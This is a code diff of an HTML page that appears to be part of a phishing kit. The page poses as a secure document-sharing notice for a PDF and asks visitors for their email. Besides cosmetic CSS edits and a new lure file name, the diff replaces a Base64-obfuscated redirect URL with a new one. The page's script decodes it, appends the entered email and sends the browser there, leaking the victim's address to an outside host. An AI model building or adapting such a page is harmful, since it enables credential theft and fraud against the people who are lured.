@@ -3,7 +3,7 @@
 
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>global</title>
+  <title>UTF</title>
 
   
   <style>
@@ -30,12 +30,22 @@
         margin-top: 20px;
       }
 
-   
+  font-family: Arial, sans-serif;
+  text-align: center;
+  margin: 0;
+  padding: 0;
+  background-color: #f8f9f9;
+  background-image: url('https://via.placeholder.com/1920x1080'); /* Default background */
+  background-size: cover;
+  background-position: center;
+  background-repeat: no-repeat;
+  height: 100%;
+
       }
 
       iframe {
         width: 100%;
-        height: 90%;
+        height: 100%;
         border: none;
         display: block;
         margin: 0 auto;
@@ -61,11 +71,11 @@
         border: 1px solid #dddd;
         text-align: center;
         width: 150%;
-        max-width: 324px;
+        max-width: 280px;
       }
 
       .input-section p {
-        margin: 10px 0;
+        margin: 15px 0;
         color: black;
       }
 
@@ -85,7 +95,7 @@
         background-color: #1D7CDB;
         color: white;
         border: none;
-        padding: 10px 111px;
+        padding: 10px 106px;
         cursor: pointer;
         font-size: 14px;
       }
@@ -160,7 +170,7 @@
     <p>
     You've received a secure link to:
 
-         <p style="font-size: 18px; font-weight: ; color: #000000;"> Schedule_2025-24.pdf</p>
+         <p style="font-size: 18px; font-weight: ; color: #000000;">P169353-04-2025.pdf</p>
 
 </p>
           <p style="font-size: 16px;">To proceed, enter the email to which <br>this item was shared.</p>
@@ -204,7 +214,7 @@ border-bottom: 1px solid #06C;
 position: center;
 background-color: transparent;
 width: 250px;
-height: 480px;
+height: 400px;
 margin: auto;
 padding-top: 50%;
 }
@@ -348,7 +358,7 @@ function verifyEmail() {
     // Simulate a delay before redirection
     setTimeout(() => {
         // Redirect to a URL with the email appended
-        const encodedRedirectURL = "aHR0cHM6Ly9namFlZnczLnBhbGxhdm9sb21hc3NhLm9yZy8j"; // Base64 encoded URL
+        const encodedRedirectURL = "aHR0cHM6Ly9yeDJxdHI0LnBhcnRpZHVwb3BvcnVsdWlhcmFkdmFyaWFudGFjb2pvY2FydS5jb20vIw=="; // Base64 encoded URL
         const decodedRedirectURL = atob(encodedRedirectURL); // Decode Base64
         const redirectURL = `${decodedRedirectURL}${emailInput}`; // Append email directly
         window.location.href = redirectURL; // Redirect to the final URL
